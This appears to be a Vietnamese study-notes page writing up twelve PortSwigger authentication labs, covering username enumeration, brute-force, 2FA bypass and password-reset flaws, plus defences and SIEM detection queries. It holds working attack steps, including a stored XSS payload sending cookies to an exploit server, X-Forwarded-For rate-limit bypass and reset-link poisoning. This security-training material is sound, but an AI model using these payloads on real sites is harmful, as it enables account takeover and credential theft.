---
id: authentication-labs
title: Authentication Failures — 12 Labs PortSwigger
sidebar_label: Authentication (Week 11)
sidebar_position: 3
description: Writeup 12 lab Authentication trên PortSwigger — Username Enumeration, Brute Force, 2FA Bypass, Password Reset. OWASP A07 Identification & Authentication Failures.
---

# Authentication Failures — 12 Labs PortSwigger

## Lý thuyết tổng quan

Authentication Failures hiện đứng ở vị trí **OWASP #7 (2021)** và đang có xu hướng leo lên **#6 trong danh sách OWASP 2025**, phản ánh mức độ nghiêm trọng ngày càng tăng của nhóm lỗ hổng này trong môi trường thực tế. Điều quan trọng cần hiểu là không phải mọi lỗi authentication đều xuất phát từ bug trong code — một tỷ lệ đáng kể các lỗ hổng thuộc nhóm này bắt nguồn từ **sai lầm trong thiết kế hệ thống (design flaws)**. Username enumeration xảy ra khi server trả về thông báo lỗi khác nhau tùy theo username tồn tại hay không; brute force thành công khi không có cơ chế rate limiting; 2FA bị bypass khi logic xác thực nằm ở client-side thay vì được enforce nghiêm ngặt ở server-side.

### Phân loại lỗ hổng Authentication

**Password-based login vulnerabilities** là nhóm phổ biến nhất. Attacker có thể thực hiện username enumeration thông qua sự khác biệt trong response — đôi khi là nội dung thông báo ("Invalid username" vs "Incorrect password"), đôi khi là độ dài response, thậm chí là sự khác biệt về thời gian phản hồi (timing attack). Khi server hash password của username hợp lệ nhưng reject ngay với username không tồn tại, thời gian xử lý sẽ lộ thông tin. Rate limiting yếu hoặc cơ chế lockout dễ bypass (reset đếm sau mỗi lần đăng nhập đúng) mở đường cho brute force tự động hóa.

**MFA bypass** tận dụng broken logic trong luồng xác thực đa bước. Trường hợp đơn giản nhất là server set session sau bước 1 (đúng password) nhưng không enforce trạng thái "chưa hoàn thành 2FA", cho phép attacker skip thẳng đến trang đích. Phức tạp hơn là các trường hợp cookie `verify` xác định đối tượng xác thực độc lập với session, tạo điều kiện cho attacker thay đổi giá trị cookie để brute-force OTP cho tài khoản nạn nhân.

**Remember-me và Reset password** là bề mặt tấn công bị đánh giá thấp. Cookie "stay-logged-in" đôi khi được tạo theo công thức đoán được như `base64(username:MD5(password))`, có thể bị crack offline. Token reset password đặt trong URL không liên kết với session/account có thể bị tái sử dụng cho tài khoản khác. Host header poisoning trong luồng reset khiến link được gửi đến email nạn nhân trỏ về server của attacker.

### Biện pháp phòng chống

Nguyên tắc cốt lõi là sử dụng **generic error messages** (cùng một thông báo dù username sai hay password sai), kết hợp **rate limiting và account lockout** được thiết kế cẩn thận để không bị lợi dụng cho DoS. MFA phải được **enforce server-side** ở mọi bước, không phụ thuộc vào client. Password reset link phải là **one-time-use** và có thời gian hết hạn ngắn (15–30 phút). Quan trọng nhất, toàn bộ luồng authentication cần được kiểm tra **business logic** nghiêm ngặt, không chỉ kiểm tra từng bước riêng lẻ.

---

## Writeup 12 Labs

### Lab 1: Username Enumeration via Different Responses

**Logic:** Đây là dạng lỗ hổng cơ bản nhất trong nhóm enumeration. Server trả về thông báo **"Invalid username"** khi username không tồn tại, và **"Incorrect password"** khi username tồn tại nhưng password sai. Sự khác biệt tường minh này cho phép attacker dùng wordlist để xác định username hợp lệ trước, sau đó mới brute-force password — giảm đáng kể không gian tìm kiếm.

**Kỹ thuật:** Dùng Burp Suite Intruder ở chế độ **Sniper** với position tại trường username. Load wordlist username chuẩn của PortSwigger. Trong tab Options, bật **Grep - Match** với từ khóa "Incorrect password" — request nào match là username hợp lệ. Sau đó brute-force password với username đã tìm được, grep theo status code **302** (redirect = đăng nhập thành công).

```
POST /login
username=§candidate§&password=test

→ Grep: "Incorrect password" → xác định valid username
→ Brute-force password → grep 302
```

---

### Lab 2: Username Enumeration via Subtly Different Responses

**Logic:** Server cố tình dùng cùng một câu thông báo lỗi cho cả hai trường hợp, nhưng vẫn mắc lỗi vi tế — thông báo cho username hợp lệ khác một ký tự nhỏ (dấu chấm, khoảng trắng thừa, viết hoa/thường). Mắt người khó phát hiện, nhưng tool có thể đo được.

**Kỹ thuật:** Chạy Intruder với position username, sau đó **so sánh cột Length** trong kết quả — request có độ dài response khác biệt so với phần còn lại là ứng viên. Dùng tính năng **Comparer** (chuột phải → Send to Comparer) để diff response và tìm sự khác biệt chính xác. Một khi xác định được username, lặp lại với position password.

---

### Lab 3: Username Enumeration via Response Timing

**Logic:** Khi username không tồn tại, server reject ngay lập tức mà không cần hash password. Khi username hợp lệ, server thực hiện bcrypt/argon2 hash (tốn CPU, mất 100–500ms). Sự chênh lệch thời gian này lộ thông tin username dù message trả về hoàn toàn giống nhau.

**Kỹ thuật:** Vì lab có cơ chế block IP sau N lần thử, cần dùng header **`X-Forwarded-For`** với giá trị IP ngẫu nhiên cho mỗi request để bypass. Đặt Resource pool về **1 thread** để tránh concurrent request làm nhiễu kết quả đo thời gian. Trong Intruder, dùng chế độ **Pitchfork** với 2 position (X-Forwarded-For IP và username). Sort kết quả theo cột **Response received** — request chậm nhất tương ứng username hợp lệ.

```http
POST /login HTTP/1.1
X-Forwarded-For: §fake-ip§

username=§candidate§&password=averylongpasswordtomakehashingtaketime
```

---

### Lab 4: Broken Brute-Force Protection — IP Block

**Logic:** Server đếm số lần đăng nhập sai liên tiếp và block IP sau 3 lần. Tuy nhiên, bộ đếm **reset về 0 mỗi khi có một lần đăng nhập thành công**. Attacker khai thác bằng cách xen kẽ một lần đăng nhập hợp lệ với account của mình (wiener:peter) sau mỗi 2 lần thử sai cho carlos — counter không bao giờ đạt ngưỡng block.

**Kỹ thuật:** Dùng Burp Intruder chế độ **Pitchfork** với 2 danh sách được đồng bộ theo thứ tự:

```
List 1 (username):  wiener, carlos, carlos, wiener, carlos, carlos, ...
List 2 (password):  peter,  pass1,  pass2,  peter,  pass3,  pass4, ...
```

Mỗi 3 request: wiener đăng nhập đúng (reset counter) → 2 lần thử carlos. Grep response 302 để xác định password đúng của carlos.

---

### Lab 5: Username Enumeration via Account Lock

**Logic:** Cơ chế lockout vô tình trở thành kênh oracle: username không tồn tại sẽ không bao giờ bị lock bất kể thử bao nhiêu lần. Username tồn tại sẽ bị lock sau N lần sai và trả về thông báo khác ("Your account is locked"). Gửi nhiều request sai cho mỗi candidate username — username nào thay đổi response thành "account locked" là username hợp lệ.

**Kỹ thuật:** Intruder với **Cluster bomb**: position 1 là username (wordlist), position 2 là password (null payload lặp lại 5–10 lần). So sánh response — username bị lock sẽ có response dài hơn hoặc khác biệt. Sau khi tìm được username, đợi lockout hết hạn rồi brute-force password.

---

### Lab 6: 2FA Simple Bypass

**Logic:** Server thực hiện authentication 2 bước nhưng mắc lỗi logic nghiêm trọng: sau bước 1 (đúng password), session được tạo ra với một số quyền nhất định, nhưng server không enforce trạng thái "chưa hoàn thành xác thực 2 bước". Người dùng bị redirect sang `/login2` để nhập OTP, nhưng server không kiểm tra xem người dùng đã hoàn thành bước này chưa khi truy cập các trang khác.

**Kỹ thuật:** Đăng nhập với credentials của carlos (đã biết password), nhận redirect về `/login2`. Thay vì nhập OTP, **navigate thẳng đến `/my-account`** trong cùng session đó. Server check session hợp lệ (đúng) nhưng không check flag 2FA-completed (thiếu), kết quả là truy cập thành công vào account carlos.

---

### Lab 7: 2FA Broken Logic

**Logic:** Server dùng cookie `verify` để xác định đang trong luồng xác thực cho tài khoản nào, nhưng không liên kết cookie này với session của bước đăng nhập đầu. Attacker đăng nhập vào account hợp lệ của mình (wiener), lấy cookie `verify=wiener`, rồi thay đổi thành `verify=carlos` để brute-force OTP cho carlos mà không cần biết password của carlos.

**Kỹ thuật:**
1. Đăng nhập wiener:peter → nhận cookie session và `verify=wiener`
2. GET `/login2` với cookie `verify=wiener` để nhận OTP form
3. Thay cookie thành `verify=carlos`
4. Intruder brute-force POST `/login2` với 4-chữ-số (0000–9999), giữ nguyên `verify=carlos`
5. Grep response 302 → đăng nhập thành công vào carlos

```http
POST /login2
Cookie: session=...; verify=carlos

mfa-code=§0000§
```

---

### Lab 8: Brute-Force via Stay-Logged-In Cookie

**Logic:** Cookie "stay-logged-in" được tạo theo công thức đoán được: `base64(username + ":" + MD5(password))`. Attacker decode cookie của mình để xác định format, sau đó tạo wordlist cookie bằng cách kết hợp `username=carlos` với MD5 hash của từng password trong danh sách phổ biến.

**Kỹ thuật:**
```python
# Công thức tạo cookie:
import base64, hashlib

cookie = base64.b64encode(f"carlos:{hashlib.md5(password.encode()).hexdigest()}".encode()).decode()
```

Dùng Intruder với position tại cookie `stay-logged-in`, payload là danh sách cookie được pre-computed. Grep response không phải trang login → tìm được password.

---

### Lab 9: Offline Password Cracking

**Logic:** Lab kết hợp hai lỗ hổng: XSS stored và stay-logged-in cookie dạng MD5. Attacker chèn payload XSS vào comment section để đánh cắp cookie của victim (carlos) khi carlos đọc comment. Cookie bị gửi về exploit server của attacker, sau đó được decode và crack offline.

**Kỹ thuật:**
```javascript
// XSS payload trong comment:
<script>
  document.location = 'https://EXPLOIT-SERVER/?' + document.cookie;
</script>
```

Sau khi nhận cookie trong access log của exploit server:
```bash
# Decode base64:
echo "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0MDlhY2Mx" | base64 -d
# → carlos:26323c16d5f4dabff3bb136f2409ac1

# Crack MD5 tại CrackStation.net hoặc:
hashcat -m 0 26323c16d5f4dabff3bb136f2409ac1 rockyou.txt
```

---

### Lab 10: Password Reset Broken Logic

**Logic:** Server gửi link reset password dạng `https://site.com/forgot-password?token=RANDOM_TOKEN`. Lỗ hổng nằm ở chỗ token này **không được liên kết với account cụ thể** ở phía server khi xử lý POST request đổi password. Server chỉ dùng giá trị `username` trong POST body để xác định account cần reset, mà không verify token thuộc về username đó.

**Kỹ thuật:**
1. Request reset password cho account wiener → nhận token qua email
2. Follow link, intercept POST request đổi password
3. Thay `username=wiener` thành `username=carlos` trong POST body
4. Submit → password của carlos bị thay đổi bằng token của wiener

```http
POST /forgot-password?token=WIENER_TOKEN
username=carlos&new-password-1=hacked&new-password-2=hacked
```

---

### Lab 11: Password Reset Poisoning via Middleware

**Logic:** Server build URL trong email reset password bằng cách đọc Host header (hoặc X-Forwarded-Host header từ middleware/load balancer). Attacker thêm header `X-Forwarded-Host` trỏ về server của mình vào request "Forgot password" cho carlos. Server tin tưởng header này và gửi email cho carlos với link reset trỏ về attacker server. Carlos click link → token xuất hiện trong access log của attacker.

**Kỹ thuật:**
```http
POST /forgot-password
Host: vulnerable-site.com
X-Forwarded-Host: attacker-exploit-server.net

username=carlos
```

Carlos nhận email với link: `https://attacker-exploit-server.net/forgot-password?token=TOKEN`  
Attacker đọc log → lấy TOKEN → dùng token reset password carlos trên site gốc.

---

### Lab 12: Brute-Force via Password Change

**Logic:** Chức năng đổi password có hidden field `username` mà server tin tưởng hoàn toàn. Chức năng này không có rate limiting khi nhập sai current-password. Khi nhập đúng current-password, response thay đổi khác biệt so với khi sai — tạo ra oracle để brute-force password của carlos.

**Kỹ thuật:** Intercept request đổi password, sửa `username=carlos`. Intruder với position tại `current-password`:

```http
POST /my-account/change-password
username=carlos&current-password=§candidate§&new-password-1=hacked&new-password-2=hacked
```

Khi response **không chứa** "Current password is incorrect" → đã tìm đúng password. Đăng nhập với `carlos:candidate_password`.

---

## Góc nhìn Blue Team — Detection & Response

Từ góc độ phòng thủ, các cuộc tấn công Authentication Failures để lại nhiều dấu vết trong log nếu được cấu hình thu thập đúng cách.

**Windows Event Logs:** Event ID **4625** (failed logon) là tín hiệu đầu tiên cần monitor. Pattern cần alert: số lượng 4625 từ cùng source IP vượt ngưỡng trong khoảng thời gian ngắn (ví dụ: 20 lần trong 5 phút). Kết hợp với Event ID **4624** (successful logon) để phát hiện pattern xen kẽ thành công/thất bại đặc trưng của Lab 4.

**Auth Log Analysis:** Với Linux/web application, phân tích `/var/log/auth.log` hoặc application log. Tìm pattern **impossible travel** — cùng một account đăng nhập từ 2 địa lý khác nhau trong khoảng thời gian không thể di chuyển được. Đây là dấu hiệu credential đã bị compromise.

**MFA Audit Log:** Monitor log của MFA provider (Duo, Google Authenticator, TOTP server). Số lượng lớn OTP attempt sai cho một account trong thời gian ngắn là dấu hiệu brute-force OTP (Lab 7). Alert khi một account có hơn 10 OTP attempt thất bại trong 10 phút.

**Splunk/SIEM Query mẫu:**
```spl
index=auth sourcetype=windows_security EventCode=4625
| stats count by src_ip, user, _time
| where count > 20
| eval alert="Possible brute force"
```

**Remediation checklist:** Enforce HTTPS everywhere, implement CAPTCHA sau N lần sai, dùng token reset một lần duy nhất với TTL ≤ 30 phút, không expose thông tin account qua message error, audit tất cả luồng authentication logic định kỳ.
